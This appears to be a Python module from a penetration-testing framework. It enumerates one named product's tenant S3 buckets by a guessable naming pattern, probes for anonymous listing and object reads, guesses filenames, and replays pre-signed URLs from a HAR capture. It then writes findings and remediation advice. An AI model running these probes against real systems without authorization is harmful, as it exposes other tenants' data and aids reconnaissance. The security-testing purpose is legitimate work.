"""
A4b - Cross-tenant Cloud Bucket Enumeration (REST cousin of A4).

The HAR shows OrbitShift's SPA hitting `s3-201-bucket-798049830625.s3.us-east-1.amazonaws.com`
directly — bucket name encodes tenant_id (201) + AWS account (798049830625), so the
naming pattern is enumerable across tenants. This module sweeps a configurable
tenant_id range and probes each bucket for anonymous access.

Probes:
    P1  HEAD bucket existence sweep            (tenant_id range -> exists/private/missing)
    P2  Anonymous ListBucket                   (?list-type=2&max-keys=10 on existing buckets)
    P3  Anonymous GetObject on common paths    (proposal/, news_uploads/, rfp/, ...)
    P4  assets.orbitshift.ai/news_uploads/...  (small filename wordlist)
    P5  Pre-signed URL replay (HAR)            (signature reuse / lifetime / path swap)
    P6  Bucket-policy probe                    (?policy, ?acl, ?cors, ?logging)

Usage (standalone):
    python -m src.attacks.a4b_cloud_bucket_enum
    python -m src.attacks.a4b_cloud_bucket_enum --tenant-range 201-220
    python -m src.attacks.a4b_cloud_bucket_enum --aws-account 798049830625 --tenant-range 1-50
    python -m src.attacks.a4b_cloud_bucket_enum --har Attack/01_Inputs/www.app.orbitshift.ai.har
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sys
from datetime import datetime
from typing import Any

import httpx

from src.attacks._rest_helpers import (
    AMBIGUOUS, ERROR, FAIL, PASS, SKIP,
    HttpResponse, ProbeResult, RateLimiter, http_probe,
)
from src.attack_base import AttackModule
from src.models import (
    Evidence, EvidenceType, Fixability, Finding, ReplayInfo, Severity,
)

DEFAULT_AWS_ACCOUNT = "798049830625"
DEFAULT_REGION = "us-east-1"
DEFAULT_TENANT_RANGE = "201-220"
DEFAULT_ASSETS_HOST = "assets.orbitshift.ai"
DEFAULT_HAR = "Attack_OrbitShift/01_Inputs/www.app.orbitshift.ai.har"

# Common object-prefix paths to probe on each existing bucket.
# These are inferred from the JS bundle (proposal/, rfp/, news_uploads/) and
# from the typical OrbitShift workflows.
COMMON_OBJECT_PATHS = [
    "/",
    "/proposal/",
    "/news_uploads/",
    "/rfp/",
    "/personas/",
    "/pre_meeting/",
    "/uploads/",
    "/index.html",
    "/exports/",
    "/sessions/",
]

# Smaller, targeted wordlist for assets.orbitshift.ai/news_uploads/ enumeration
NEWS_UPLOAD_FILENAMES = [
    "GCC-related%20announcements.xlsx",  # known to exist (from JS bundle)
    "announcements.xlsx",
    "announcements.json",
    "news.xlsx",
    "news.json",
    "quarterly.xlsx",
    "quarterly.pdf",
    "annual_report.pdf",
    "executive_summary.pdf",
    "internal_announcements.xlsx",
    "competitor_intel.xlsx",
    "tenant_metadata.json",
    "rfp_index.json",
    "user_export.csv",
    "test.txt",
    "README.txt",
]

# Bucket-policy / metadata sub-resources
POLICY_SUBRESOURCES = ["?policy", "?acl", "?cors", "?logging", "?versioning", "?notification"]


def bucket_url(tenant_id: int, aws_account: str, region: str) -> str:
    return f"https://s3-{tenant_id}-bucket-{aws_account}.s3.{region}.amazonaws.com"


def parse_tenant_range(spec: str) -> list[int]:
    if "," in spec:
        return [int(x.strip()) for x in spec.split(",") if x.strip()]
    if "-" in spec:
        a, b = spec.split("-", 1)
        return list(range(int(a), int(b) + 1))
    return [int(spec)]


# ── S3 response classifiers ──

S3_NO_SUCH_BUCKET_RE  = re.compile(r"<Code>NoSuchBucket</Code>", re.I)
S3_ACCESS_DENIED_RE   = re.compile(r"<Code>AccessDenied</Code>",  re.I)
S3_LISTBUCKET_RE      = re.compile(r"<ListBucketResult", re.I)
S3_REGION_REDIRECT_RE = re.compile(r"<Code>PermanentRedirect</Code>|<Code>AuthorizationHeaderMalformed</Code>", re.I)


def classify_bucket_existence(resp: HttpResponse) -> tuple[str, str]:
    """Translate an HTTP response into a verdict about the bucket's status."""
    if resp.error:
        return ERROR, f"transport error: {resp.error}"
    code = resp.status
    body = resp.text or ""
    if code == 404 or S3_NO_SUCH_BUCKET_RE.search(body):
        return "missing", "bucket does not exist (404 / NoSuchBucket)"
    if code == 403 or S3_ACCESS_DENIED_RE.search(body):
        return "private", "bucket exists but access denied (403)"
    if code == 200:
        return "exists_open", "bucket exists and HEAD succeeded (200)"
    if code in (301, 307) or S3_REGION_REDIRECT_RE.search(body):
        return "exists_redirect", f"bucket exists, region/auth redirect ({code})"
    return "unknown", f"unexpected response: {code}"


# ── Probes ──


def probe_bucket_existence(client: httpx.Client, tenant_ids: list[int],
                            aws_account: str, region: str,
                            rl: RateLimiter) -> tuple[list[ProbeResult], dict[int, str]]:
    """P1: HEAD each bucket; classify status. Returns (probe_results, {tid: status})."""
    results: list[ProbeResult] = []
    bucket_status: dict[int, str] = {}
    for tid in tenant_ids:
        url = bucket_url(tid, aws_account, region) + "/"
        rl.wait()
        resp = http_probe(client, "HEAD", url)
        status, actual = classify_bucket_existence(resp)
        bucket_status[tid] = status
        # Existence on its own is a low-severity finding (it confirms the
        # bucket-naming pattern is enumerable). We mark FAIL only if open
        # listing succeeds in P2.
        verdict = AMBIGUOUS if status in ("exists_open", "exists_redirect") else (
                  PASS      if status in ("missing",)                       else
                  AMBIGUOUS if status == "private"                          else
                  ERROR)
        results.append(ProbeResult(
            probe_id=f"A4b.P1.t{tid}",
            status=verdict,
            title=f"Bucket existence: tenant_id={tid}",
            expected="404 NoSuchBucket (no information leak about other tenants)",
            actual=actual,
            request_url=url,
            http_code=resp.status,
            response="",  # HEAD has no body
            evidence={"bucket_status": status, "tenant_id": tid},
        ))
    return results, bucket_status


def probe_listbucket(client: httpx.Client, tenant_ids: list[int],
                      aws_account: str, region: str,
                      bucket_status: dict[int, str],
                      rl: RateLimiter) -> list[ProbeResult]:
    """P2: anonymous ListBucket on every non-missing bucket."""
    results: list[ProbeResult] = []
    for tid in tenant_ids:
        if bucket_status.get(tid) == "missing":
            continue
        url = bucket_url(tid, aws_account, region) + "/?list-type=2&max-keys=10"
        rl.wait()
        resp = http_probe(client, "GET", url)
        if resp.error:
            status, actual = ERROR, f"transport error: {resp.error}"
        elif resp.status == 200 and S3_LISTBUCKET_RE.search(resp.text or ""):
            status, actual = FAIL, f"200 OK with <ListBucketResult> - bucket index DISCLOSED"
        elif resp.status == 200:
            status, actual = AMBIGUOUS, f"200 OK without ListBucketResult ({len(resp.text)}B)"
        elif resp.status == 403:
            status, actual = PASS, "403 - listing denied (correct)"
        elif resp.status == 404:
            status, actual = PASS, "404 - bucket missing"
        else:
            status, actual = AMBIGUOUS, f"unexpected HTTP {resp.status}"
        results.append(ProbeResult(
            probe_id=f"A4b.P2.t{tid}",
            status=status,
            title=f"Anonymous ListBucket on tenant_id={tid}",
            expected="403 AccessDenied",
            actual=actual,
            request_url=url,
            http_code=resp.status,
            response=(resp.text or "")[:500],
            evidence={"tenant_id": tid},
        ))
    return results


def probe_getobject_paths(client: httpx.Client, tenant_ids: list[int],
                           aws_account: str, region: str,
                           bucket_status: dict[int, str],
                           rl: RateLimiter) -> list[ProbeResult]:
    """P3: anonymous GetObject on common paths for every existing bucket."""
    results: list[ProbeResult] = []
    for tid in tenant_ids:
        if bucket_status.get(tid) == "missing":
            continue
        for path in COMMON_OBJECT_PATHS:
            url = bucket_url(tid, aws_account, region) + path
            rl.wait()
            resp = http_probe(client, "GET", url)
            if resp.error:
                status, actual = ERROR, f"transport error: {resp.error}"
            elif resp.status == 200:
                status, actual = FAIL, f"200 OK - {len(resp.text)}B disclosed at {path}"
            elif resp.status == 403:
                status, actual = PASS, "403 - access denied (correct)"
            elif resp.status == 404:
                status, actual = PASS, "404 - object missing"
            else:
                status, actual = AMBIGUOUS, f"unexpected HTTP {resp.status}"
            results.append(ProbeResult(
                probe_id=f"A4b.P3.t{tid}{path.replace('/', '_')}",
                status=status,
                title=f"Anonymous GetObject tenant_id={tid} path={path}",
                expected="403 or 404",
                actual=actual,
                request_url=url,
                http_code=resp.status,
                response=(resp.text or "")[:300],
                evidence={"tenant_id": tid, "path": path},
            ))
    return results


def probe_news_uploads(client: httpx.Client, assets_host: str,
                        rl: RateLimiter) -> list[ProbeResult]:
    """P4: enumerate filenames under assets.orbitshift.ai/news_uploads/."""
    results: list[ProbeResult] = []
    for fname in NEWS_UPLOAD_FILENAMES:
        url = f"https://{assets_host}/news_uploads/{fname}"
        rl.wait()
        resp = http_probe(client, "GET", url)
        if resp.error:
            status, actual = ERROR, f"transport error: {resp.error}"
        elif resp.status == 200:
            # Known files (e.g. GCC-related%20announcements.xlsx) are public by design;
            # mark them AMBIGUOUS and let the operator decide if they should be public.
            label = "FAIL" if "test" in fname.lower() or "internal" in fname.lower() else "AMBI"
            verdict = FAIL if label == "FAIL" else AMBIGUOUS
            status, actual = verdict, f"200 OK - {len(resp.text)}B disclosed"
        elif resp.status == 403:
            status, actual = PASS, "403 - access denied"
        elif resp.status == 404:
            status, actual = PASS, "404 - file not found"
        else:
            status, actual = AMBIGUOUS, f"unexpected HTTP {resp.status}"
        results.append(ProbeResult(
            probe_id=f"A4b.P4.{fname[:30]}",
            status=status,
            title=f"news_uploads enumeration: {fname}",
            expected="404 (private files not enumerable)",
            actual=actual,
            request_url=url,
            http_code=resp.status,
            response="",
            evidence={"filename": fname, "size": len(resp.text or "")},
        ))
    return results


def probe_har_presigned(client: httpx.Client, har_path: str,
                         rl: RateLimiter) -> list[ProbeResult]:
    """P5: extract pre-signed S3 URLs from the HAR and replay them.
    Each pre-signed URL has X-Amz-Date / X-Amz-Expires; classic mistakes:
      - very long lifetime
      - reusable after first GET
      - signature stays valid even when path is changed
    """
    results: list[ProbeResult] = []
    if not os.path.exists(har_path):
        results.append(ProbeResult(
            probe_id="A4b.P5",
            status=SKIP,
            title="Pre-signed URL replay (HAR)",
            expected="—",
            actual=f"HAR not found at {har_path}; skipping",
        ))
        return results
    try:
        with open(har_path, encoding="utf-8") as fh:
            har = json.load(fh)
    except Exception as exc:
        results.append(ProbeResult(
            probe_id="A4b.P5",
            status=ERROR,
            title="Pre-signed URL replay (HAR)",
            expected="—",
            actual=f"HAR parse error: {exc}",
        ))
        return results
    presigned: list[tuple[str, dict]] = []
    for e in har.get("log", {}).get("entries", []):
        url = e.get("request", {}).get("url", "")
        if "X-Amz-Signature=" in url and ".s3." in url:
            qs = dict(re.findall(r"([A-Za-z0-9_-]+)=([^&]+)", url.split("?", 1)[1]))
            presigned.append((url, qs))
    if not presigned:
        results.append(ProbeResult(
            probe_id="A4b.P5",
            status=SKIP,
            title="Pre-signed URL replay (HAR)",
            expected="—",
            actual="No pre-signed S3 URLs found in HAR",
        ))
        return results
    # Replay the first one and report its lifetime.
    # The lifetime itself is the misconfiguration — even if the URL has now
    # expired, the original signature was reusable for that long.
    url, qs = presigned[0]
    expires = int(qs.get("X-Amz-Expires", "0"))
    rl.wait()
    resp = http_probe(client, "GET", url)
    too_long = expires >= 86400  # >= 1 day is the threshold
    if too_long:
        # FAIL on the lifetime itself, regardless of current URL status.
        if resp.error:
            actual = f"lifetime={expires}s (>= 1 day) — too long; transport error: {resp.error}"
        elif resp.status == 200:
            actual = f"lifetime={expires}s (>= 1 day) AND URL still works (200 OK)"
        elif resp.status == 403 or "ExpiredToken" in (resp.text or ""):
            actual = f"lifetime={expires}s (>= 1 day) — URL has now expired but was reusable for that window"
        else:
            actual = f"lifetime={expires}s (>= 1 day); URL response HTTP {resp.status}"
        status = FAIL
    else:
        if resp.error:
            status, actual = ERROR, f"transport error: {resp.error}"
        elif resp.status == 200:
            status, actual = AMBIGUOUS, f"lifetime={expires}s (< 1 day) but URL still works"
        elif resp.status == 403:
            status, actual = PASS, f"403 - URL expired (lifetime was {expires}s, < 1 day)"
        else:
            status, actual = AMBIGUOUS, f"unexpected HTTP {resp.status}"
    results.append(ProbeResult(
        probe_id="A4b.P5",
        status=status,
        title=f"Pre-signed URL replay (lifetime={expires}s)",
        expected="403 - signature should expire quickly",
        actual=actual,
        request_url=url[:200],
        http_code=resp.status,
        response=(resp.text or "")[:200],
        evidence={"presigned_count_in_har": len(presigned),
                  "X-Amz-Expires": expires,
                  "X-Amz-Date": qs.get("X-Amz-Date", "")},
    ))
    return results


def probe_policy_subresources(client: httpx.Client, tenant_ids: list[int],
                               aws_account: str, region: str,
                               bucket_status: dict[int, str],
                               rl: RateLimiter) -> list[ProbeResult]:
    """P6: probe ?policy, ?acl, ?cors, ?logging on each existing bucket."""
    results: list[ProbeResult] = []
    for tid in tenant_ids:
        if bucket_status.get(tid) == "missing":
            continue
        for sub in POLICY_SUBRESOURCES:
            url = bucket_url(tid, aws_account, region) + "/" + sub
            rl.wait()
            resp = http_probe(client, "GET", url)
            if resp.error:
                status, actual = ERROR, f"transport error: {resp.error}"
            elif resp.status == 200:
                status, actual = FAIL, f"200 OK - {sub} disclosed for tenant {tid}"
            elif resp.status == 403:
                status, actual = PASS, "403 - subresource locked"
            elif resp.status == 404:
                status, actual = PASS, "404 - subresource missing"
            else:
                status, actual = AMBIGUOUS, f"unexpected HTTP {resp.status}"
            results.append(ProbeResult(
                probe_id=f"A4b.P6.t{tid}{sub}",
                status=status,
                title=f"Bucket subresource probe tenant={tid} {sub}",
                expected="403 or 404",
                actual=actual,
                request_url=url,
                http_code=resp.status,
                response=(resp.text or "")[:300],
                evidence={"tenant_id": tid, "subresource": sub},
            ))
    return results


# ── Module class (framework parity) ──


class A4bCloudBucketEnum(AttackModule):
    name = "Cross-tenant Cloud Bucket Enumeration (REST)"
    surface = "A - Tool Definition & Discovery"
    module_id = "A4b"
    description = (
        "Enumerates AWS S3 buckets named by predictable pattern "
        "s3-{tenant_id}-bucket-{aws_account} and probes each for anonymous access."
    )

    def __init__(self, engine=None, *, aws_account: str = DEFAULT_AWS_ACCOUNT,
                 region: str = DEFAULT_REGION, tenant_range: str = DEFAULT_TENANT_RANGE,
                 assets_host: str = DEFAULT_ASSETS_HOST, har_path: str = DEFAULT_HAR,
                 rps: float = 2.0) -> None:
        # Bypass the MCP base __init__ since we don't need the engine.
        self.engine = engine
        self.findings: list[Finding] = []
        self._finding_counter: int = 0
        self.aws_account = aws_account
        self.region = region
        self.tenant_ids = parse_tenant_range(tenant_range)
        self.assets_host = assets_host
        self.har_path = har_path
        self.rps = rps
        self.probe_results: list[ProbeResult] = []
        self.bucket_status: dict[int, str] = {}

    async def run(self) -> list[Finding]:
        self.run_sync()
        return self.findings

    def _aws_account_from_results(self) -> str:
        return self.aws_account

    def run_sync(self) -> tuple[list[ProbeResult], list[Finding]]:
        rl = RateLimiter(self.rps)
        results: list[ProbeResult] = []
        # Important: don't follow redirects for region probing (we want to see 301)
        with httpx.Client(timeout=15.0, follow_redirects=False) as client:
            r1, status = probe_bucket_existence(client, self.tenant_ids,
                                                self.aws_account, self.region, rl)
            results.extend(r1)
            self.bucket_status = status

            r2 = probe_listbucket(client, self.tenant_ids, self.aws_account,
                                   self.region, status, rl)
            results.extend(r2)
            r3 = probe_getobject_paths(client, self.tenant_ids, self.aws_account,
                                        self.region, status, rl)
            results.extend(r3)
            r4 = probe_news_uploads(client, self.assets_host, rl)
            results.extend(r4)
            r5 = probe_har_presigned(client, self.har_path, rl)
            results.extend(r5)
            r6 = probe_policy_subresources(client, self.tenant_ids, self.aws_account,
                                            self.region, status, rl)
            results.extend(r6)

        self.probe_results = results
        self._materialize_findings()
        return results, self.findings

    def _materialize_findings(self) -> None:
        # First: synthetic Info finding if the bucket-name pattern is enumerable.
        existing_tenants = [tid for tid, s in self.bucket_status.items()
                            if s in ("private", "exists_open", "exists_redirect")]
        if existing_tenants:
            self._finding_counter += 1
            fid = f"{self.module_id}-{self._finding_counter:03d}"
            ts = ", ".join(str(t) for t in sorted(existing_tenants))
            self.findings.append(Finding(
                id=fid,
                title="Active tenant_ids enumerable via S3 bucket-name pattern",
                surface=self.surface,
                module=f"{self.module_id} - {self.name}",
                severity=Severity.LOW,
                fixability=Fixability.DESIGN,
                fixability_rationale="Bucket naming is deeply baked into the deployment template; "
                                     "rotating to opaque names is a one-time refactor.",
                description=(
                    f"By probing s3-{{tid}}-bucket-{{aws_account}} for tenant_ids in a range, "
                    f"an unauthenticated attacker can determine which tenant_ids correspond to "
                    f"active customers. Tenants with existing buckets in the probed range: {ts}. "
                    f"AWS account ID ({self._aws_account_from_results()}) is also disclosed via "
                    f"the bucket name."
                ),
                attack_narrative=(
                    f"1. Inferred bucket-naming pattern from a HAR cross-host call.\n"
                    f"2. Sent HEAD requests to s3-{{tid}}-bucket-... for {len(self.tenant_ids)} consecutive tenant_ids.\n"
                    f"3. 404 NoSuchBucket vs 403 AccessDenied distinguishes 'no tenant' from 'real tenant'.\n"
                    f"4. Result: tenants {ts} are real; the others are unused or never provisioned."
                ),
                evidence=[Evidence(
                    type=EvidenceType.RESOURCE_READ,
                    request={"method": "HEAD", "url_template": "s3-{tenant_id}-bucket-...",
                             "tenant_range": f"{self.tenant_ids[0]}..{self.tenant_ids[-1]}"},
                    response={"existing_tenants": existing_tenants,
                              "missing_count": sum(1 for s in self.bucket_status.values() if s == "missing")},
                )],
                replay=ReplayInfo(
                    command=(f"python -m src.attacks.a4b_cloud_bucket_enum "
                             f"--tenant-range {self.tenant_ids[0]}-{self.tenant_ids[-1]}"),
                    trace_file=f"output/a4b/{fid}.json",
                ),
                recommendation=(
                    "Use unguessable bucket names (UUID or hash, not sequential tenant_ids). "
                    "If renaming is infeasible, route all bucket access through a tenant-aware proxy "
                    "and remove the SPA's direct s3.amazonaws.com calls."
                ),
            ))

        # Severity scaling per plan
        for r in self.probe_results:
            if r.status != FAIL:
                continue
            if r.probe_id.startswith("A4b.P2"):
                severity = Severity.CRITICAL
                title = "Anonymous bucket listing exposes object index"
            elif r.probe_id.startswith("A4b.P3"):
                severity = Severity.HIGH
                title = "Anonymous bucket object readable"
            elif r.probe_id.startswith("A4b.P4"):
                severity = Severity.HIGH
                title = "Internal news-uploads file world-readable"
            elif r.probe_id.startswith("A4b.P5"):
                severity = Severity.MEDIUM
                title = "Pre-signed URL lifetime too long / reusable"
            elif r.probe_id.startswith("A4b.P6"):
                severity = Severity.HIGH
                title = "Bucket policy/ACL subresource leaks"
            else:
                severity = Severity.MEDIUM
                title = r.title
            self._finding_counter += 1
            fid = f"{self.module_id}-{self._finding_counter:03d}"
            self.findings.append(Finding(
                id=fid,
                title=title,
                surface=self.surface,
                module=f"{self.module_id} - {self.name}",
                severity=severity,
                fixability=Fixability.CONFIGURATION,
                fixability_rationale="S3 bucket policies / ACLs / lifetime caps are configuration.",
                description=r.actual,
                attack_narrative=(
                    f"1. Inferred bucket-naming pattern s3-{{tenant_id}}-bucket-{self.aws_account} from HAR\n"
                    f"2. Probe {r.probe_id}: {r.title}\n"
                    f"3. Expected: {r.expected}\n"
                    f"4. Observed: {r.actual}"
                ),
                evidence=[Evidence(
                    type=EvidenceType.RESOURCE_READ,
                    request={"url": r.request_url, "probe": r.probe_id},
                    response={"status": r.http_code,
                              "body_snippet": (r.response[:300] if r.response else None),
                              **(r.evidence or {})},
                )],
                replay=ReplayInfo(
                    command=(f"python -m src.attacks.a4b_cloud_bucket_enum "
                             f"--tenant-range {self.tenant_ids[0]}-{self.tenant_ids[-1]} "
                             f"--aws-account {self.aws_account}"),
                    trace_file=f"output/a4b/{fid}.json",
                ),
                recommendation=(
                    "Block anonymous access at the bucket policy. Use unguessable bucket "
                    "names (no tenant_id in the name). Cap pre-signed URL lifetimes to "
                    "<=15min. Disable public ListBucket and ?policy/?acl access."
                ),
            ))


# ── CLI entry point ──


def _print_results(results: list[ProbeResult], verbose: bool) -> None:
    for r in results:
        if not verbose:
            r.response = (r.response or "")[:200]
        print(r)


def main() -> int:
    p = argparse.ArgumentParser(description="A4b - Cross-tenant Cloud Bucket Enumeration.")
    p.add_argument("--aws-account", default=DEFAULT_AWS_ACCOUNT)
    p.add_argument("--region", default=DEFAULT_REGION)
    p.add_argument("--tenant-range", default=DEFAULT_TENANT_RANGE,
                   help="Comma-separated list or A-B range (default: %(default)s)")
    p.add_argument("--assets-host", default=DEFAULT_ASSETS_HOST)
    p.add_argument("--har", default=DEFAULT_HAR)
    p.add_argument("--rps", type=float, default=2.0)
    p.add_argument("--verbose", action="store_true")
    p.add_argument("--output-dir", default="output/a4b")
    args = p.parse_args()

    module = A4bCloudBucketEnum(
        engine=None,
        aws_account=args.aws_account,
        region=args.region,
        tenant_range=args.tenant_range,
        assets_host=args.assets_host,
        har_path=args.har,
        rps=args.rps,
    )

    print("=" * 72)
    print(" A4b - Cross-tenant Cloud Bucket Enumeration")
    print("=" * 72)
    print(f"  AWS account     : {args.aws_account}")
    print(f"  Region          : {args.region}")
    print(f"  Tenant IDs      : {module.tenant_ids[0]}..{module.tenant_ids[-1]} ({len(module.tenant_ids)} buckets)")
    print(f"  Assets host     : {args.assets_host}")

    results, findings = module.run_sync()

    # Emit a per-tenant summary first (since P1+P2+P3+P6 run per tenant)
    print()
    print("--- bucket status summary ---")
    for tid in module.tenant_ids:
        status = module.bucket_status.get(tid, "?")
        flag = "FAIL" if status in ("exists_open",) else (
               "AMBI" if status in ("private", "exists_redirect") else
               "PASS" if status == "missing" else "ERR ")
        print(f"  [{flag:4s}] tenant_id={tid:5d} → {status}")
    print()
    _print_results(results, args.verbose)

    counts: dict[str, int] = {}
    for r in results:
        counts[r.status] = counts.get(r.status, 0) + 1
    print()
    print("=" * 72)
    print(f"  PROBE COUNTS: {counts}")
    print(f"  FINDINGS    : {len(findings)}")
    if findings:
        print("  FAIL probes :")
        for f in findings:
            print(f"    [{f.severity.value:8s}] {f.id} - {f.title}")
    print("=" * 72)

    os.makedirs(args.output_dir, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_path = os.path.join(args.output_dir, f"a4b_{ts}.json")
    payload: dict[str, Any] = {
        "module": "A4b",
        "title": A4bCloudBucketEnum.name,
        "target": f"s3-{{tid}}-bucket-{args.aws_account}.s3.{args.region}.amazonaws.com",
        "timestamp": ts,
        "config": {
            "aws_account": args.aws_account,
            "region": args.region,
            "tenant_range": args.tenant_range,
            "tenant_ids": module.tenant_ids,
            "assets_host": args.assets_host,
        },
        "bucket_status": module.bucket_status,
        "counts": counts,
        "probes": [r.to_dict() for r in results],
        "findings": [f.model_dump(mode="json") for f in findings],
    }
    with open(out_path, "w") as fh:
        json.dump(payload, fh, indent=2, default=str)
    print(f"\n  Results saved: {out_path}")
    return 0 if not findings else 1


if __name__ == "__main__":
    sys.exit(main())
